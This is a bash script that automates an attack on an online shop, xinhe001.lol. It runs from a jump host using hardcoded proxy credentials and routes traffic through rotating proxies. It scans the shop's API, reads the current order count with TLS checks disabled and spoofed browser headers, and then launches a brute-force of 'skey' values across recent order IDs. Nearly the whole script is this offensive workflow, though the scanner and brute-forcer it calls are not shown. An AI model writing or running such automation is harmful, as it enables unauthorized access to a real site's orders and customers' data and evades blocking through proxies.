#!/bin/bash
# Run on domestic jump (124.248.67.170) — uses local qg-proxy-fetch + C413ED6D
set -euo pipefail
export QG_CN_KEY="${QG_CN_KEY:-C413ED6D}"
export QG_CN_PWD="${QG_CN_PWD:-344F550A6F8B}"
OUT="${XINHE_OUT:-/data/automation/results/xinhe001.lol/cn_jump_$(date +%Y%m%d_%H%M%S)}"
mkdir -p "$OUT"

/data/automation/bin/qg-proxy-fetch.sh
# shellcheck disable=SC1091
source /data/config/proxy.env
export PROXY_URL PROXY_AREA
echo "proxy=$PROXY_URL area=$PROXY_AREA" | tee "$OUT/proxy.log"

python3 /data/automation/bin/qg_cn_proxy.py | tee "$OUT/probe.log"

echo "=== api scan ===" | tee -a "$OUT/progress.log"
export CN_API_DELAY="${CN_API_DELAY:-4}"
python3 -u /data/automation/bin/xinhe001_cn_api_scan.py "$OUT/api" 0 "${API_N:-400}" | tee -a "$OUT/progress.log"

if [[ "${RUN_SKEY:-1}" == "1" ]]; then
  /data/automation/bin/qg-proxy-fetch.sh
  source /data/config/proxy.env
  export QG_TUNNEL="$PROXY_URL"
  ORDERS=$(python3 -c "
import json, os, requests
requests.packages.urllib3.disable_warnings()
p=os.environ['QG_TUNNEL']
s=requests.Session(); s.verify=False; s.proxies={'http':p,'https':p}
s.headers.update({'User-Agent':'Mozilla/5.0','Referer':'https://xinhe001.lol/shop/'})
s.get('https://xinhe001.lol/shop/',timeout=25)
print(json.loads(s.get('https://xinhe001.lol/shop/ajax.php?act=getcount',timeout=15).text).get('orders',5737))
")
  END=$((ORDERS - ${SKEY_RANGE:-800}))
  echo "=== skey brute $ORDERS..$END ===" | tee -a "$OUT/progress.log"
  python3 -u /data/automation/bin/xinhe001_skey_brute.py "$OUT/skey" "$ORDERS" "$END" | tee -a "$OUT/progress.log"
fi

echo "DONE $OUT" | tee -a "$OUT/progress.log"
